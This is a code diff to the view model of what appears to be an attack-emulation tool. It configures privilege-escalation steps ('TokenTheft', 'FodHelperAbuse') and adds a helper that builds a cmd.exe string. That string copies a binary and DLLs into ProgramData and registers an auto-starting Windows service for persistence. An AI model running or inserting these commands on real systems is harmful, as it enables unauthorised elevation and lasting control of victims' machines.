@@ -17,7 +17,7 @@ public partial class BehaviorChainViewModel : ViewModelBase
     private readonly ChainBehaviorService _chainBehaviorService;
 
     private string DefaultServiceBinaryPath = Paths.ServiceBinaryPath;
-    string destExe = @"C:\ProgramData\3.exe";
+    string destExe = @"C:\ProgramData\Mabean\3.exe";
 
     [ObservableProperty]
     [NotifyPropertyChangedFor(nameof(ShowPrivEscFields), nameof(ShowPrivEscPidField))]
@@ -90,16 +90,24 @@ public partial class BehaviorChainViewModel : ViewModelBase
             Payloads = new ObservableCollection<string>(payloads);
     }
 
+    private string BuildFodHelperCommand(string resolvedBinaryPath) =>
+        $@"cmd.exe /c " +
+        $@"copy /Y ""{resolvedBinaryPath}"" ""{destExe}"" && " +
+        $@"robocopy ""{Paths.SessionConfigDir}"" ""C:\ProgramData\Mabean\SessionConfig"" /E & " +
+        $@"robocopy ""{Paths.Dlls}"" ""C:\ProgramData\Mabean\Dlls"" /E & " +
+        $@"sc create {PersistenceServiceName} binPath= ""{destExe}"" start= auto && " +
+        $@"sc start {PersistenceServiceName}";
+
     private async Task RunChain()
     {
         var resolvedBinaryPath = PersistenceUseDefaultPath ? DefaultServiceBinaryPath : PersistenceBinaryPath;
-        var fodHelperCommand = $@"cmd.exe /c copy /Y ""{resolvedBinaryPath}"" ""{destExe}"" && sc create {PersistenceServiceName} binPath= ""{destExe}"" start= auto && sc start {PersistenceServiceName}""";
+        var fodHelperCommand = BuildFodHelperCommand(resolvedBinaryPath);
 
         var definition = new BehaviorChainDefinition
         {
             PrivEsc = PrivEscEnabled ? new PrivEscStep
             {
-                Behavior = PrivEscBehavior,
+                Behavior = PrivEscBehavior, 
                 TargetPid = PrivEscBehavior == "TokenTheft" ? PrivEscTargetPid : null,
                 ExecPath = PrivEscBehavior == "FodHelperAbuse" ? fodHelperCommand : null
             } : null,
